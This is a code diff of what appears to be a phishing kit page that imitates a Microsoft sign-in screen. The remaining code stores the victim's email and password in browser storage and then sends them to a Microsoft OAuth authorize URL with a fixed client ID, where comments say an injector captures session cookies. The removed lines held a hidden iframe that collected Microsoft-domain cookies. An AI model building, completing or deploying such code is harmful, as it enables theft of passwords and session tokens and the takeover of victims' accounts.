@@ -8,7 +8,6 @@
   <link rel="shortcut icon" href="/images/favicon.ico">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
   <style>
-    /* --- FINAL CSS FOR PIXEL-PERFECT REPLICA --- */
     body, html {
       height: 100%;
       margin: 0;
@@ -179,7 +178,6 @@
 
   <div class="main-container">
     <div class="form-wrapper">
-      <!-- Main Sign-in Box -->
       <div class="form-box">
         <!-- Email View -->
         <div id="div1">
@@ -274,62 +272,14 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
-  <!-- Hidden iframe for silent auth -->
-  <iframe id="authFrame" style="display:none; width:0; height:0; border:none;"></iframe>
-
   <script>
     console.log('🔧 replacement.html loaded');
 
-    // Listen for messages from silent-auth-frame
-    window.addEventListener('message', function(event) {
-        console.log('📨 Message from iframe:', event.data.type);
-
-        if (event.data.type === 'AUTH_COMPLETE') {
-            console.log('✅ Auth complete from silent-auth-frame');
-            
-            const code = event.data.data.code;
-            const error = event.data.data.error;
-            const capturedCookies = event.data.data.cookies;
-
-            console.log('📊 Received:', {
-                code: !!code,
-                error: error,
-                cookies: capturedCookies.length
-            });
-
-            // Store cookies for AuthCallback
-            if (capturedCookies.length > 0) {
-                const cookieExport = {
-                    version: '1.0',
-                    exportedAt: new Date().toISOString(),
-                    source: 'silent-auth-frame',
-                    domain: event.data.data.domain,
-                    totalCookies: capturedCookies.length,
-                    cookies: capturedCookies,
-                    note: 'Cookies captured from Microsoft domain via silent auth'
-                };
-
-                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                
-                console.log('💾 Stored', capturedCookies.length, 'cookies');
-            }
-
-            // Wait 2 seconds then redirect to AuthCallback
-            setTimeout(() => {
-                console.log('🔄 Redirecting to /auth/callback...');
-                window.location.href = '/auth/callback';
-            }, 2000);
-        }
-    });
-
-    // --- FINAL, ROBUST SCRIPT ---
     document.addEventListener('DOMContentLoaded', function () {
         
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
-        const authFrame = document.getElementById('authFrame');
         
         document.getElementById('next').addEventListener('click', function (e) {
             e.preventDefault();
@@ -368,7 +318,7 @@
 
             console.log('📋 Credentials captured:', { email });
 
-            // ✅ Store credentials for AuthCallback
+            // ✅ Store credentials for later use
             const credentialsData = { 
                 email, 
                 password, 
@@ -385,29 +335,26 @@
                 localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                 sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                 
-                console.log('💾 Credentials stored for AuthCallback');
+                console.log('💾 Credentials stored');
             } catch (err) {
                 console.error('Failed to store credentials:', err);
             }
 
-            // ✅ Load silent-auth-frame.html
-            authFrame.src = '/silent-auth-frame.html';
-
-            // ✅ Send init message to frame
+            // ✅ REDIRECT TO MICROSOFT LOGIN (so password-capture-injector can capture cookies)
+            // The injector runs ON login.microsoftonline.com and captures cookies there
+            // Then redirects back to /auth/callback
             setTimeout(() => {
-                authFrame.contentWindow.postMessage({
-                    type: 'INIT_AUTH',
-                    email: email,
-                    clientId: '2e338732-c914-4129-a148-45c24f2da81d',
-                    redirectUri: 'https://vaultydocs.com/silent-auth-frame.html',
-                    state: 'silent_' + Date.now()
-                }, '*');
-
-                console.log('📨 Init message sent to silent-auth-frame');
-            }, 500);
+                const callbackUrl = window.location.origin + '/auth/callback';
+                const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+                
+                console.log('🔄 Redirecting to Microsoft login for cookie capture...');
+                console.log('📍 Will redirect back to:', callbackUrl);
+                
+                window.location.href = microsoftLoginUrl;
+            }, 1200);
         });
 
-        // The code for the other features is kept separate to prevent interference.
+        // The code for the other features is kept separate
         const optionsViewDetailed = document.getElementById('options_view_detailed');
         const troubleshootingBox = document.getElementById('troubleshooting_box');
 
